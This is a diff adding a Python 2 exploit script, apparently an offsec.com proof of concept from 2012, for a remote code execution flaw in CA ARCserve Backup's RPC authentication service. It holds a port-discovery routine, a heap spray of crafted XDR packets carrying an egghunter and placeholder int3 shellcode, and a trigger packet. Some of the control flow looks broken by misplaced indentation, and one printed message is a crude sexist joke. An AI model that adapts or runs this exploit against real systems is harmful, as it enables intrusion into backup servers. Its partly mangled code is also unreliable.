@@ -1,0 +1,162 @@
+import time, struct, sys, threading, os
+import socket as so
+
+"""
+CA ARCserve Backup r16 sp1 RWSList RCE 0day
+offsec.com 5/8/2012
+"""
+
+COUNT = 0
+# egghunter
+EH ='\x33\xD2\x90\x90\x90\x42\x52\x6a'
+EH +='\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
+EH +='\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
+EH +='\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
+# bp int3
+int3 = "\xcc" * 287
+SH = "n00bn00b" + int3
+
+TRIGGER = (
+"\x80\x00\x02\x68\x4f\x9d\x17\x25\x00\x00\x00\x00\x00\x00\x00\x02"
+"\x00\x06\x09\x80\x00\x00\x00\x01\x00\x00\x00\x7a\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\xa1"
+"\x02\x35\x32\x35\x34\x30\x30\x30\x31\x30\x30\x30\x30\x30\x30\x30"
+"\x41\x30\x30\x30\x30\x30\x30\x30\x32"
+"\x30\x30\x30\x30\x30\x30\x31\x30"
+"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
+"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
+"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
+"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
+"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
+"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
+"\x30\x30\x34\x45\x38\x44\x44\x31\x36\x34\x44\x33\x41\x37\x31\x42"
+"\x39\x43\x36\x46\x34\x43\x46\x42\x41\x42\x34\x32\x35\x35\x42\x44"
+"\x41\x00\x00\x00"
+"\x00\x00\x00\xb1"
+"\x02\x35\x32\x35\x34\x30\x30\x30"
+"\x31\x30\x30\x30\x30\x30\x30\x30\x41\x30\x30\x30\x30\x30\x30\x30"
+"\x32"
+"\x30\x30\x30\x30\x30\x30\x31\x30"
+"\x30\x30\x30\x30\x30\x30\x30"
+"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
+"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
+"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
+"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
+"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
+"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x46\x30\x38\x30\x31\x43\x42"
+"\x41\x37\x38\x37\x36\x44\x46\x30\x45\x44\x41\x44\x31\x36\x44\x43"
+"\x38\x36\x36\x38\x39\x37\x33\x43\x31\x00\x00\x00"
+"\x41\x41\x41\x41"
+"\x41\x41\x41\x41"
+"\x41\x41\x41\x41"
+"\x41\x41\x41\x41"
+"\x41\x41\x41\x41"
+# xdr_rwtime object triggers calls 0x276e7365 This is mappable
+"\x00\x00\x00\x04"
+"\x54\x69\x6d\x65"
+"\x00\x00\x00\x04"
+"\x41\x41\x41\x41"
+)
+
+def portDiscover(server):
+    """ Discover caauthd.exe listening port """
+    print "[+] Requesting RPC auth port to the server..."
+    getport =(
+    "\x80\x00\x00\x38\x4f\x9d\xb4\xb2\x00\x00\x00\x00\x00\x00\x00\x02"
+    "\x00\x01\x86\xa0\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x00"
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    "\x00\x06\x09\x80\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00"
+    )
+    try:
+        s = so.socket(so.AF_INET, so.SOCK_STREAM)
+        s.connect((server, port))
+        s.send(getport)
+        reply = s.recv(100)
+    except Exception,e:
+        print str(e)
+        sys.exit()
+        authport = struct.unpack("&gt;I",reply[-4:])[0]
+        print "[+] Authentication Services are on port %d" % authport
+    return authport
+
+def leakbaby(leaksize, ts, sc):
+    """ Create the allocation packet """
+    req = "\x80\x00\x02\x68" # xdr_u_long
+    req += "\x4f\x9d\x17\x25" # xdr_u_long
+    req += "\x00\x00\x00\x00" # xdr_enum Check at 0x2E00A6AC
+    req += "\x00\x00\x00\x02" # xdr_u_long Check at 0x2E00A6D0
+    req += "\x00\x06\x09\x80" # xdr_u_long Check at 0x2E010170 progn
+    req += "\x00\x00\x00\x01" # xdr_u_long Check at 0x2E010181 progver
+    req += "\x00\x00\x00\x7a" # xdr_u_long Check at 0x00401699 JmpT
+
+    ### xdr_opaque_auth start
+    req += "\x00\x00\x00\x00" # xdr_enum Check at 0x2E01032C
+    ##### xdr_bytes start
+    ######### xdr_int
+    req += "\x00\x00\x00\x00" # xdr_int
+    #### xdr_bytes end
+    ### xdr_opaque_auth end
+
+    ### xdr_opaque_auth start
+    req += "\x00\x00\x00\x00" # xdr_enum
+    ##### xdr_bytes start
+    ######### xdr_int
+    req += "\x00\x00\x00\x00" # xdr_int
+    #### xdr_bytes end
+    ### xdr_opaque_auth end
+
+    ### xdr_string3 start
+    ##### xdr_int
+    req += leaksize # xdr_int -sizer fuzz maxsize 0xffffffff
+    ######### xdr_opaque
+    #req += "\xCC"*ts # xrd_opaque
+    req += "\x90"*(ts - len(sc)) + sc
+    ### xdr_string3 end
+    return req
+
+def sendme(req, server, authport):
+    """ Send data to the server """
+    s = so.socket(so.AF_INET, so.SOCK_STREAM)
+    global COUNT
+    try:
+        s.connect((server, authport))
+        s.send(req)
+        COUNT += 1
+        #print "PACKET %d sent" % COUNT
+    except Exception,e:
+        pass
+
+if __name__ == '__main__':
+    try:
+        server = sys.argv[1]
+        port = 111
+    except IndexError:
+        print "[*] Usage: %s " % sys.argv[0]
+        sys.exit()
+
+authport = portDiscover(server)
+
+sarttime=time.time()
+print "[+] Spraying in progress, please wait 1 minute..."
+print "[*] Feeding the baby like a big boobs italian mama would do..."
+req = leakbaby("\x00\x10\x00\x00", 0x226, SH)
+for i in range(544):#
+    sendme(req, server, authport)
+    time.sleep(0.05)
+    COUNT = 0
+
+req = leakbaby("\x00\x00\x02\x26", 0x226, EH)
+while COUNT < 100000:#
+    for k in range(800):
+        t = threading.Thread(target=sendme,
+        args=(req, server, authport))
+        t.start()
+        time.sleep(0.1)
+        endtime = time.time() - sarttime
+        print "[*] BURP!!!!"
+        print "[*] Spray time in secs:", endtime
+        time.sleep(0.2)
+        print "[$] Triggering RCE..."
+        sendme(TRIGGER, server, authport)
+        print "[$] Done! Check Debugger, you should get int3 executed in 1 min..."
